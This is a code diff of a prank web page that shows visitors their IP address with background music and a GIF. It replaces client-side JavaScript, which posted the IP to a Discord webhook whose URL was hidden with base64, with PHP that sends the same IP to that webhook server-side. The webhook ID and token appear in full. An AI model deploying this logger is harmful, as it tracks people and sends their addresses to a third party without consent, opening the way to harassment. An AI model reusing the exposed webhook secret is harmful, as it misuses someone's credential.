@@ -91,7 +91,7 @@
             background: rgba(255, 255, 255, 0.1);
             border-radius: 10px;
             box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
-            color: white; /* Weiße Schrift */
+            color: white;
         }
 
         body::before {
@@ -113,74 +113,68 @@
     </div>
     
     <div id="mainContent">
-        <div id="player"></div>
-        <p id="ipDisplay">Loading your IP address...</p>
+        <p id="ipDisplay"><?php echo htmlspecialchars($user_ip); ?></p>
         <p class="subtitle">Your IP address has been logged</p>
 
         <div id="audioPlayer">
             <audio id="audio" loop>
-                <source src="https://cdn.discordapp.com/attachments/1151144288483283016/1331247379873267722/video0_4.mp3?ex=6790ec3c&is=678f9abc&hm=b7fb03d1208db3c18da202c24059577c6738efdfdfcfe9cca3a06ecc05887a4f&" type="audio/mpeg">
+                <source src="https://cdn.discordapp.com/attachments/1151144288483283016/1331247379873267722/video0_4.mp3" type="audio/mpeg">
                 Your browser does not support the audio element.
             </audio>
         </div>
     </div>
 
     <script>
-        const audio = document.getElementById('audio');
         const entrance = document.getElementById('entrance');
         const mainContent = document.getElementById('mainContent');
         const clickMe = document.getElementById('clickMe');
+        const audio = document.getElementById('audio');
         
         function startExperience() {
             entrance.style.display = 'none';
             mainContent.style.display = 'block';
             tryPlayAudio();
-            document.body.style.backgroundImage = "linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('https://cdn.discordapp.com/attachments/1151144288483283016/1331247474635046912/video0_4.gif?ex=6790ec53&is=678f9ad3&hm=3a89976dba559a1ec904403da9ae7cb8b11e1434f7cb45290010984b293bc1b7&')";
+            document.body.style.backgroundImage = "linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('https://cdn.discordapp.com/attachments/1151144288483283016/1331247474635046912/video0_4.gif')";
         }
 
         clickMe.addEventListener('click', startExperience);
-        
+
         function tryPlayAudio() {
             audio.play().catch(function(error) {
-                console.log("Audio autoplay failed:", error);
+                console.error("Audio autoplay failed:", error);
             });
         }
-
-        async function logIP() {
-            try {
-                const response = await fetch("https://api.ipify.org?format=json");
-                const data = await response.json();
-                const ip = data.ip;
-
-                document.getElementById('ipDisplay').textContent = `${ip}`;
-
-                const key = ['1329145060230692935', '-93HduLZfipXZnGgRBszzvfpOHYdAjWwcAElg9N_FdT4IB4pPbr05lUMQdtoSqTrqR4h'];
-                const func = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv') + key[0] + '/' + key[1];
-                
-                const encoder = new TextEncoder();
-                const decoder = new TextDecoder();
-                
-                const encoded = encoder.encode(func);
-                const final = decoder.decode(encoded);
-
-                await fetch(final, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
-                    body: JSON.stringify({
-                        content: `IP Address: ${ip}`,
-                        timestamp: new Date().toISOString(),
-                    }),
-                });
-            } catch (error) {
-                console.error("Error logging IP:", error);
-                document.getElementById('ipDisplay').textContent = "Error loading IP address";
-            }
-        }
-
-        
-        logIP();
     </script>
+
+    <?php
+    // Determine the user's IP address
+    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
+        // Cloudflare header for real IP
+        $user_ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        // Check for forwarded IP (load balancers, proxies)
+        $user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    } else {
+        // Default to remote address
+        $user_ip = $_SERVER['REMOTE_ADDR'];
+    }
+
+    // PHP Code to Send IP to Discord Webhook
+    $webhook_url = 'https://discord.com/api/webhooks/1329145060230692935/-93HduLZfipXZnGgRBszzvfpOHYdAjWwcAElg9N_FdT4IB4pPbr05lUMQdtoSqTrqR4h';
+    $payload = json_encode([
+        'content' => "IP Address: $user_ip",
+        'username' => 'IP Loggerchat',
+        'avatar_url' => 'https://example.com/avatar.png',
+    ]);
+
+    $ch = curl_init($webhook_url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+
+    $response = curl_exec($ch);
+    curl_close($ch);
+    ?>
 </body>
 </html>
